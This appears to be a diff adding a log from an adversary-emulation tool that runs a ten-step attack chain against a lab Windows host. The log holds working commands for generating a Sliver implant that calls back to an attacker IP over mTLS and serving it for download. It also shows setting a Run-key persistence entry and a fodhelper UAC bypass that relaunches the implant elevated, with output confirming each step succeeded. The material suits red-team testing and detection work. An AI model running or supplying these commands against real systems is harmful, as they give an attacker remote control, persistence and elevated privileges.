@@ -1,0 +1,220 @@
+┌──(env_aurora-executor)─(kali㉿kali)-[~/Desktop/Aurora-executor-demo/run-20260713T163756Z-78114f34/chain-003]
+└─$ python attack_chain.py --params attack_chain.params.yml
+╭──────────────── Hello ────────────────╮
+│ 🎯 Welcome to Attack Execution Wizard │
+╰───────────── Let's Begin ─────────────╯
+
+📌[Sliver Console] Step 1
+
+📌[Name] Build the executable file of a Sliver implant (for Windows)
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the attacker machine
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: listening port of the attacter machine
+➤ Enter value for LPORT (current: 8443 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the generated payload
+➤ Enter value for SAVE_PATH (current: '/home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe' , required: True): 
+
+[Sliver Console] Commands to run (one per line, copy each separately):
+  sliver > generate --mtls 192.168.56.43:8443 --os windows --arch 64bit --format exe --save /home/kali/Desktop/Aurora-executor-demo/sliver_save/chain_sl.exe
+  sliver > mtls --lport 8443
+  ⚠ This step requires manual Sliver console interaction.
+Have you completed this Sliver console step? [y/n] (y): 
+
+📌[Human] Step 2
+
+📌[Name] Simulate the victim download and execute malicious payload file
+ Parameter Input
+  Parameter: LHOST
+  Description: IP address of the http file server (typically the attacker machine)
+➤ Enter value for LHOST (current: '192.168.56.43' , required: True): 
+ Parameter Input
+  Parameter: LPORT
+  Description: port of the http file server
+➤ Enter value for LPORT (current: 8000 , required: True): 
+ Parameter Input
+  Parameter: SAVE_PATH
+  Description: Saved path of the downloaded payload
+➤ Enter value for SAVE_PATH (current: 'C:\\Users\\Public\\chain_sl.exe' , required: True): 
+
+⚠ Human action required:
+╭──────────────────────────────────────────────────── Manual Step ─────────────────────────────────────────────────────╮
+│ (This step needs human interaction and (temporarily) cannot be executed automatically)                               │
+│ (On attacker's machine)                                                                                              │
+│ python -m http.server 8000                                                                                           │
+│                                                                                                                      │
+│ (On victim's machine)                                                                                                │
+│ 1. Open 192.168.56.43:8000 in the browser                                                                            │
+│ 2. Navigate to the path of the target payload file                                                                   │
+│ 3. Download the payload file                                                                                         │
+│ 4. Execute the payload file to C:\Users\Public\chain_sl.exe (If on a Linux machine, you also need to chmod the file) │
+│                                                                                                                      │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+⏸  Have you completed this manual step? [y/n] (y): 
+
+📌[Session Check] Step 3
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: (none)
+  Newly detected session(s):
+     MINISTERIAL_TRIPOD@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: e5971deb-0d39-488f-b46c-fd584d0abda1, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 4
+
+📌[Name] User Context Verification
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+Available Sessions:
+[0] e5971deb-0d39-488f-b46c-fd584d0abda1 - MINISTERIAL_TRIPOD@WIN-BASE - WIN-BASE\useradmin(windows)
+Select session number: 0
+
+[Sliver Executor] Executing: whoami
+Keep going with the next attack step? [y/n] (y): 
+Exec Stdout: "win-base\useradmin\r\n"
+Pid: 2180
+
+
+📌[Sliver Session Derive] Step 5
+📌[Name] Execute PowerShell Command
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: e5971deb-0d39-488f-b46c-fd584d0abda1
+  ↳ Derived executor_derived executor from Sliver session e5971deb-0d39-488f-b46c-fd584d0abda1
+
+📌[Sliver Session Derive] Step 6
+📌[Name] Execute Command (cmd.exe)
+ Parameter Input
+  Parameter: executor_parent
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: e5971deb-0d39-488f-b46c-fd584d0abda1
+  ↳ Derived executor_derived executor from Sliver session e5971deb-0d39-488f-b46c-fd584d0abda1
+
+📌[Command Prompt Executor] Step 7
+
+📌[Name] Reg Key Run
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID used to invoke reg add.
+  ✓ Using stored value: e5971deb-0d39-488f-b46c-fd584d0abda1
+ Parameter Input
+  Parameter: value_name
+  Description: Registry value name under Run key.
+➤ Enter value for value_name (current: 'AuroraChainPersist' , required: True): 
+ Parameter Input
+  Parameter: command_to_execute
+  Description: Command / path to execute at next user logon.
+➤ Enter value for command_to_execute (current: 'C:\\Windows\\System32\\notepad.exe' , required: True): 
+
+[Command Prompt Executor] Command to run via Sliver:
+  REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "AuroraChainPersist" /t REG_SZ /F /D "C:\Windows\System32\notepad.exe"
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V AuroraChainPersist /t REG_SZ /F /D C:\Windows\System32\notepad.exe
+  stdout: The operation completed successfully.
+
+📌[Command Prompt Executor] Step 8
+
+📌[Name] Bypass UAC using Fodhelper
+ Parameter Input
+  Parameter: executor
+  Description: The Command Prompt session ID (unelevated, admin-group user) used to invoke the UAC-bypass sequence.
+  ✓ Using stored value: e5971deb-0d39-488f-b46c-fd584d0abda1
+ Parameter Input
+  Parameter: EXE_PATH
+  Description: Path of the executable on the victim host that fodhelper will run with elevated integrity. Common chain use is to point at a pre-staged 
+Meterpreter / Sliver payload. Default `cmd.exe` spawns an elevated command prompt — useful for interactive testing of the bypass itself.
+  ✓ Using stored value: C:\Users\Public\chain_sl.exe
+
+[Command Prompt Executor] Command to run via Sliver:
+  reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Users\Public\chain_sl.exe" /f
+reg.exe add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /f
+C:\Windows\System32\fodhelper.exe
+
+Run this command? [y/n] (y): 
+[Command Prompt Executor] Running…
+[*] Target session OS is: windows
+Executing with cmd.exe: reg.exe add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d C:\Users\Public\chain_sl.exe /f
+  stdout: The operation completed successfully.
+Executing with cmd.exe: reg.exe add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
+  stdout: The operation completed successfully.
+Executing with cmd.exe: C:\Windows\System32\fodhelper.exe
+
+📌[Session Check] Step 9
+📌[Name] Execute a Sliver Implant Payload
+[Session Check] Polling for new sliver session (30s)…
+  Previously known sessions: ['e5971deb-0d39-488f-b46c-fd584d0abda1']
+  Newly detected session(s):
+     MINISTERIAL_TRIPOD@WIN-BASE — WIN-BASE\useradmin (windows)
+➤ Session id to accept (default: b087992a-61b4-4e04-8811-438ec351577d, or 'n' to abort chain): 
+
+📌[Sliver Executor] Step 10
+
+📌[Name] Remove Remote Path
+ Parameter Input
+  Parameter: executor
+  Description: The session ID of the active Sliver connection.
+  ✓ Using stored value: e5971deb-0d39-488f-b46c-fd584d0abda1
+ Parameter Input
+  Parameter: RemotePath
+  Description: Remote path
+  ✓ Using stored value: C:\Users\Public\chain_sl.exe
+ Parameter Input
+  Parameter: Recursive
+  Description: Recursively remove file(s)
+➤ Enter value for Recursive (current: False , required: True): 
+ Parameter Input
+  Parameter: Force
+  Description: Forcefully remove the file(s)
+➤ Enter value for Force (current: True , required: True): 
+
+[Sliver Executor] Executing: rm
+Keep going with the next attack step? [y/n] (y): 
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✗ Step 10 failed: Remove Remote Path
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "remove C:\Users\Public\chain_sl.exe: Access is denied."
+        debug_error_string = "UNKNOWN:Error received from peer  {created_time:"2026-07-17T10:42:20.16452513-05:00", grpc_status:2, grpc_message:"remove 
+C:\\Users\\Public\\chain_sl.exe: Access is denied."}"
+>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+══════════════════════════════════════════════════════════════════════
+  Attack Chain Run Summary
+══════════════════════════════════════════════════════════════════════
+Step  Name                                                             Start                    End                      Duration  Status
+   1  Build the executable file of a Sliver implant (for Windows)      2026-07-17 15:40:40 UTC  2026-07-17 15:41:11 UTC     30.8s    ✓   
+   2  Simulate the victim download and execute malicious payload file  2026-07-17 15:41:11 UTC  2026-07-17 15:41:47 UTC     35.9s    ✓   
+   3  Execute a Sliver Implant Payload                                 2026-07-17 15:41:47 UTC  2026-07-17 15:41:50 UTC      2.4s    ✓   
+   4  User Context Verification                                        2026-07-17 15:41:50 UTC  2026-07-17 15:41:54 UTC      3.9s    ✓   
+   5  Execute PowerShell Command                                       2026-07-17 15:41:54 UTC  2026-07-17 15:41:54 UTC      0.0s    ✓   
+   6  Execute Command (cmd.exe)                                        2026-07-17 15:41:54 UTC  2026-07-17 15:41:54 UTC      0.0s    ✓   
+   7  Reg Key Run                                                      2026-07-17 15:41:54 UTC  2026-07-17 15:42:03 UTC      9.2s    ✓   
+   8  Bypass UAC using Fodhelper                                       2026-07-17 15:42:03 UTC  2026-07-17 15:42:05 UTC      2.6s    ✓   
+   9  Execute a Sliver Implant Payload                                 2026-07-17 15:42:05 UTC  2026-07-17 15:42:09 UTC      4.1s    ✓   
+  10  Remove Remote Path                                               2026-07-17 15:42:09 UTC  2026-07-17 15:42:20 UTC     10.3s    ✗   
+
+  Failed steps (1):
+  ✗ Step 10: Remove Remote Path
+      <AioRpcError of RPC that terminated with:
+        status = StatusCode.UNKNOWN
+        details = "remove C:\Users\Public\chain_sl.exe: Access is denied."
+        debug_error_string = "UNKNOWN:Error received from peer  {created_time:"2026-07-17T10:42:20.16452513-05:00", grpc_status:2, grpc_message:"remove 
+C:\\Users\\Public\\chain_sl.exe: Access is denied."}"
+      >
+
+  Total: 10 steps executed (9 ✓, 0 ?, 1 ✗) in 1m 39s
+══════════════════════════════════════════════════════════════════════
